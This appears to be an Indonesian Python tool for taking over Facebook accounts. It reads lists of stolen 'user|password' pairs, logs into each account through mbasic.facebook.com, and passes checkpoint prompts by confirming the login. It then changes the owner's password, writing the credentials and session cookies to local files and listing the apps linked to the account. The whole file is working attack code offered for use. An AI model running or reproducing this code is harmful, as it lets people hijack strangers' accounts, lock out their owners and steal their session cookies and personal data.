#---------------[ Ini Cuma Rehabilitasi ]-------------#

import requests,bs4,json,os,sys,random,datetime,time,re,platform
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import track
from time import sleep
from bs4 import BeautifulSoup
from datetime import datetime

#--------------[ TEAM-SUPPORT ]-----------#
web_fb = "https://www.facebook.com/"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
url_mb = "https://mbasic.facebook.com"

ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%sâ€¢%sâ€¢%s'%(ha,op,ta)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#------------[ KATOK-KOLOR ]-------------#
sir = '\033[41m\x1b[1;97m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
u = '\033[95m' # UNGU
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
kk = '\x1b[1;96m'
#------------------[ CHEKPOINT-DETEKTOR ]--------------------#
def gabut():
    dirs = os.listdir("CP")
    cetak(nel('\t[cyan]â€¢[white] Hasil [yellow]CheckPoint[white] Yang Tersimpan Di File Anda [cyan]â€¢[white]'))
    for file in dirs:
        print(" [%sÃ—%s] %s"%(k,N,file))
    print(f'â€”'*70)
    files = input(f'\n {x}[{b}â€¢{x}] Masukkan Nama File :{h} ')
    try:
        buka_baju = open(f'CP/{files}','r').readlines()
    except IOError:
        print('\n [!] file tidak ada');time.sleep(2);exit()
    ww=input(f" {x}[{b}â€¢{x}] Ubah Password Ketika Tap Croot {h}y{x}/{k}t{x} : ")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f" [{H}â€¢{N}] Contoh Password : {H}alvinoxy{N}")
        pwBar=input(f"\n [{H}+{N}] Masukkan Password : ")
        if len(pwBar) <= 5:
             print('\n %s[%sÃ—%s] kata sandi minimal 6 karakter'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print('%s [%s+%s] Terdapat %s%s%s Akun Untuk Di Check'%(N,O,N,h,str(len(buka_baju)),N))
    print(f'â€”'*70)
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        print('â€”'*70)
        print(f' {x}[{b}â€¢{x}] Login Ke Akun : {K}{kontol.replace(" [Ã—] ", "")}{N}')
        try:
            log_hasil(titid[0].replace(" [Ã—] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print(f'   {x}[ {h}Proses Check Selesai {x}]\n');exit()
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {x}[{m}Ã—{x}] Akun Terkena Sesi New !")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('CP/OKE.txt', 'a').write(f" [âœ“] {user}|{pasw}|{coki}\n")
            print(f"\r  ðŸ”¥{H} Akun Tidak ChekPoint{N}");print(f"\r  {O}${H}  Sedang Mengubah Password....{N}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r  ðŸ”¥{H} Tab Croot Ayang ðŸ”¥{N}");print(f"\r  {N}[{H}âœ“{N}]  Sedang Mengubah Password...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "AlvinoGanteng:v"
                    print(f"\r  ðŸ”¥{H} Tab Croot Ayang ðŸ”¥{N}");print(f"\r  {N}[{H}âœ“{N}]  Sedang Mengubah Password...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%sx%s] Akun Terpasang Autentikasi 2 Faktor'%(m,N))
            else:
                open('CP/ERROR.txt', 'a').write(f" [Ã—] {user}|{pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f" [Ã—] {user}|{pasw}\n")
            print(" %s[%s+%s] Terdapat %s%s%s Opsi "%(N,b,N,h,len(cek),N))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}x{N}] Katasandi Salah Atau Sudah Diubah !")
        open('CP/INVALID-OK.txt', 'a').write(f" [Ã—] {user}|{pasw}\n")

def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}âœ“{N}] berhasil mengubah password menjadi:\n {N}[{H}âœ“{N}]{H} {user}|{''.join(mmk)}|{coki}{N}")
        open('CP/TAB-YES.txt', 'a').write(f" [âœ“] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(session,coki)

# CEK APLIKASI YANG TERKAIT
def cek_apk(session,cookie):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] Tidak Ada Aplikasi Aktif")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(O,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] Tidak Ada Aplikasi Kadaluarsa")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(M,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
gabut()
